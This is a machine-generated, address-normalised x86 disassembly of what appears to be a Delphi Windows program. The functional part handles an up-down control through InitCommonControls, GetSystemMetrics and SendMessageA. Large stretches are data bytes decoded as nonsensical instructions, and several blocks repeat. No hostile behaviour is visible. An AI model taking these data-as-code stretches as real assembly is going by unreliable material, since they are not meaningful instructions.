add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] dl
push eax
add [ eax ] al
outsb
movsb [ edi ] [ esi ]
mov ecx 0x610043
add bh bh
clc
sti
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
ja r-xdata
add [ esi + ecx + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
cmovae eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
cmovae eax [ eax ]
inc eax
add al [ eax ]
add al al
or al 0x43
add [ edx + eax + 0x34700042 ] ch
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
jb r-xdata
adc [ eax ] al
0x18ff0000 0x440a
add [ ecx ] al
mov edx 0x740043
add bh bh
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4109000d ] al
jae r-xdata
test [ esi ] cl
inc ebx
add [ eax ] dl
push cs
inc ebx
add [ edi ] ah
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
mov ecx 0x72600043
inc esp
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
push esp
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ edx ] dl
add al [ eax ]
dec eax
sbb eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x64 ] al
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
js r-xdata
sbb [ ebx ] 0x43
add [ ecx ] al
outsd
inc eax
add [ eax ] cl
add al [ eax ]
insb
jae r-xdata
adc [ eax ] al
push ds
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x6f ] edx
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] dl
inc eax
add [ edx + 0x18ff0000 ] bl
or al [ eax + eax + 0x1 ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
stc
inc esp
add [ eax + eax ] bh
[ eax + ecx + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090016 ] al
jo r-xdata
jb r-xdata
imul esp [ edi + 0x6e ] 0x74747542
outsd
insb
or eax [ eax ]
or eax [ ecx + 0x6c ]
add [ edx + ecx + 0x2280043 ] bh
add bh bh
mov esp 0x100431d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c001f ] al
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
js r-xdata
popad
outsb
jae r-xdata
pushad
jb r-xdata
outsb
jne r-xdata
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ ecx ] cl
push eax
imul ebp [ esi + 0x74 ] 0x430af873
add [ ecx ] ch
add al [ eax ]
dec [ eax + 0x1d ]
inc ebx
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebp
outsb
je r-xdata
retn 0x43
adc [ eax ] al
push edi
add [ eax ] al
inc esp
pop es
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
pop ds
add al [ eax ]
push [ eax + 0x1e ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
xor al 0x1e
add al ah
jb r-xdata
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
dec eax
sbb eax [ ebx ]
insb
sbb al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ eax ] cl
push eax
outsd
jae r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
sbb eax 0x72570400
popad
jo r-xdata
or eax [ ebx ]
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ edx ] cl
dec edi
add al [ eax ]
push [ esi + ebx ]
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
je r-xdata
inc edi
add [ eax ] al
jne r-xdata
dec ebp
outsd
jbe r-xdata
outsd
outsb
je r-xdata
js r-xdata
outsb
inc ebx
push 0x69676e61
outsb
inc eax
or al 0x43
add [ eax ] bh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
jo r-xdata
or [ eax + eax - 0x44 ] eax
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0xb010000 ] bl
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c15c
mov [ rw-data ] eax
pop ecx
pop edx
pop ebx
retn
or [ ebx + 0xe00043 ] bh
add bh bh
loopne r-xdata
push es
dec edi
js r-xdata
outsd
ja r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
add [ ecx - 0x74fbdbbc ] cl
cmp [ ebx + 0xd80043 ] 0x0
insd
arpl [ esp + ebp * 2 + 0x33 ] si
xor ch [ esi ]
insb
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
inc ebp
js r-xdata
sar bh 0xff
add al [ eax ]
or eax [ ebx ]
and [ edx ] al
add bh bh
sub_430fea
clc
sbb eax 0x10043
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push cs
add [ ecx ] cl
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
outsd
ja r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
adc al 0x2
add bh bh
adc [ ebx + eax * 2 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
inc [ eax + 0x100431b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ edx ] dl
add al [ eax ]
dec eax
sbb eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x64 ] al
jns r-xdata
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
jb r-xdata
adc [ eax ] al
0x18ff0000 0x440a
add [ ecx ] al
mov edx 0x740043
add bh bh
js r-xdata
js r-xdata
add [ fs : eax ] al
add [ ecx ] dl
add [ ebx ] al
dec ebp
popad
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc al
sub [ eax + eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
int3
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
mov ecx 0x72600043
inc esp
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
push esp
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
adc [ eax ] al
push ds
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x6f ] edx
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] dl
inc eax
add [ edx + 0x18ff0000 ] bl
or al [ eax + eax + 0x1 ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
stc
inc esp
add [ eax + eax ] bh
[ eax + ecx + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090016 ] al
jo r-xdata
jb r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c001f ] al
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
js r-xdata
popad
outsb
jae r-xdata
pushad
jb r-xdata
outsb
jne r-xdata
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ ecx ] cl
push eax
imul ebp [ esi + 0x74 ] 0x430af873
add [ ecx ] ch
add al [ eax ]
dec [ eax + 0x1d ]
inc ebx
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebp
outsb
je r-xdata
retn 0x43
adc [ eax ] al
push edi
add [ eax ] al
inc esp
pop es
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
pop ds
add al [ eax ]
push [ eax + 0x1e ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
xor al 0x1e
add al ah
jb r-xdata
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
dec eax
sbb eax [ ebx ]
insb
sbb al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ eax ] cl
push eax
outsd
jae r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
sbb eax 0x72570400
popad
jo r-xdata
or eax [ ebx ]
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ edx ] cl
dec edi
add al [ eax ]
push [ esi + ebx ]
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
je r-xdata
inc edi
add [ eax ] al
jne r-xdata
dec ebp
outsd
jbe r-xdata
outsd
outsb
je r-xdata
js r-xdata
outsb
inc ebx
push 0x69676e61
outsb
inc eax
or al 0x43
add [ eax ] bh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
jo r-xdata
or [ eax + eax - 0x44 ] eax
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0xb010000 ] bl
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c15c
mov [ rw-data ] eax
pop ecx
pop edx
pop ebx
retn
or [ ebx + 0xe00043 ] bh
add bh bh
loopne r-xdata
push es
dec edi
js r-xdata
outsd
ja r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
add [ ecx - 0x74fbdbbc ] cl
cmp [ ebx + 0xd80043 ] 0x0
insd
arpl [ esp + ebp * 2 + 0x33 ] si
xor ch [ esi ]
insb
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
inc ebp
js r-xdata
sar bh 0xff
add al [ eax ]
or eax [ ebx ]
and [ edx ] al
add bh bh
sub_43125d
cmp [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ edi + ecx * 2 ] cl
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
js r-xdata
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebp
outsb
je r-xdata
retn 0x43
dec ebp
outsd
jne r-xdata
jb r-xdata
inc edi
add [ eax ] al
jne r-xdata
dec ebp
outsd
jbe r-xdata
outsd
outsb
je r-xdata
js r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c15c
mov [ rw-data ] eax
pop ecx
pop edx
pop ebx
retn
or [ ebx + 0xe00043 ] bh
add bh bh
loopne r-xdata
push es
dec edi
js r-xdata
outsd
ja r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
add [ ecx - 0x74fbdbbc ] cl
cmp [ ebx + 0xd80043 ] 0x0
insd
arpl [ esp + ebp * 2 + 0x33 ] si
xor ch [ esi ]
insb
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
inc ebp
js r-xdata
sar bh 0xff
add al [ eax ]
or eax [ ebx ]
and [ edx ] al
add bh bh
sub_431394
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42a7a4
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_431420
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_442db8
push 0x2
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_440060
push 0x14
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_440084
mov eax [ ebx + 0x4c ]
mov edx eax
sar eax 0x1
jns r-xdata
add esp 0xfffffff0
call sub_403540
add edx eax
mov eax ebx
call sub_440084
mov [ ebx + 0x208 ] 0x1
mov [ ebx + 0x21f ] 0x0
mov [ ebx + 0x21c ] 0x0
mov [ ebx + 0x210 ] 0x0
mov [ ebx + 0x212 ] 0x64
mov [ ebx + 0x214 ] 0x1
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x229 ] 0x1
mov [ ebx + 0x21e ] 0x1
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
adc eax 0x0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4314ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x10
call sub_431394
mov edx ebx
mov eax esi
call sub_443f18
or [ ebx + 0x4 ] 0x2
cmp [ esi + 0x228 ] 0x1
jne r-xdata
or [ ebx + 0x4 ] 0x8
or [ ebx + 0x4 ] 0x4
jmp r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x40
cmp [ esi + 0x229 ] 0x0
jne r-xdata
cmp [ esi + 0x21e ] 0x0
jne r-xdata
or [ ebx + 0x4 ] 0x20
cmp [ esi + 0x21f ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x80
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_443e44
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
or [ ebx + 0x4 ] 0x1
sub_431580
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
call sub_444044
mov eax [ ebx + 0x20c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_440060
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c68
push eax
push 0x0
push 0x465
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406c68
push eax
push 0x0
push 0x467
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov eax [ ebx + 0x214 ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_431aa4
push 0x0
mov eax [ ebx + 0x20c ]
call sub_4470c4
push eax
push 0x469
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_431658
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_403418
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_403418
sub_4316b0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_445678
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4470c4
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_4316e0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_403418
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_403418
sub_431754
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x1
xor ebx ebx
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x210 ]
jge r-xdata
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x212 ]
jle r-xdata
cmp [ esi + 0x21a ] 0x0
jl r-xdata
mov ax [ esi + 0x21a ]
test ax ax
jge r-xdata
cmp [ esi + 0x21a ] 0x0
jle r-xdata
xor ebx ebx
jmp r-xdata
test ax ax
jle r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esi + 0x232 ] 0x0
je r-xdata
mov bl 0x1
cmp [ esi + 0x23a ] 0x0
je r-xdata
mov ecx esp
mov edx esi
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
mov ax [ esi + 0x218 ]
push eax
push ebx
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_431810
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x8 ] 0xfffffd2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov dx [ esi + 0xc ]
mov bp [ esi + 0x10 ]
add dx bp
mov ecx ebp
mov eax edi
call sub_431738
xor al 0x1
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
sub_431868
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x1
test edi edi
je r-xdata
xor ebx ebx
mov edx esi
mov eax edi
call sub_403180
test al al
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4031a8
mov edi eax
test edi edi
jne r-xdata
sub_431898
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431a76
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_443dbc
dec eax
test eax eax
jl r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431a7d
lea eax [ ebp - 0x18 ]
call sub_403f6c
retn
mov eax [ esi + 0x30 ]
cmp eax [ ebx + 0x30 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x20c ] eax
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_443d80
cmp ebx eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_443d80
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_443d80
cmp esi [ eax + 0x20c ]
jne r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4033a8
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_443d80
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
mov eax esi
mov edx [ rw-data ]
call sub_4033a8
test al al
jne r-xdata
mov eax esi
call sub_403164
mov edx r-xdata
call sub_431868
test al al
jne r-xdata
mov eax esi
call sub_403164
mov edx r-xdata
call sub_431868
test al al
jne r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_431aa4
push 0x0
mov eax esi
call sub_4470c4
push eax
push 0x469
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
lea edx [ ebp - 0x18 ]
movsx eax [ ebx + 0x21c ]
call sub_408240
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4408d4
sub_431aa4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x40 ]
push 0x0
mov eax ebx
call sub_4470c4
push eax
push 0x469
mov eax ebp
call sub_4470c4
push eax
call SendMessageA
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x40 ]
mov ecx esi
sub ecx eax
mov eax ecx
mov ebp edx
sub ebp edi
lea edx [ eax + esi ]
mov eax ebx
call sub_440060
mov edx edi
sub edx ebp
mov eax ebx
call sub_440014
pop ebp
pop edi
pop esi
pop ebx
retn
sub_431af8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43fd74
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
mov eax edi
call sub_4473c8
test al al
je r-xdata
push 0x0
push 0x0
push 0x469
mov eax edi
call sub_4470c4
push eax
call SendMessageA
xor eax eax
mov [ edi + 0x20c ] eax
sub_431b48
push ebx
mov ebx eax
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov ax [ ebx + 0x21c ]
pop ebx
retn
push 0x0
push 0x0
push 0x468
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
mov [ ebx + 0x21c ] ax
pop ebx
retn
sub_431b80
push ebx
mov ebx eax
cmp dx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dx
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c68
push eax
push 0x0
push 0x465
mov eax ebx
call sub_4470c4
push eax
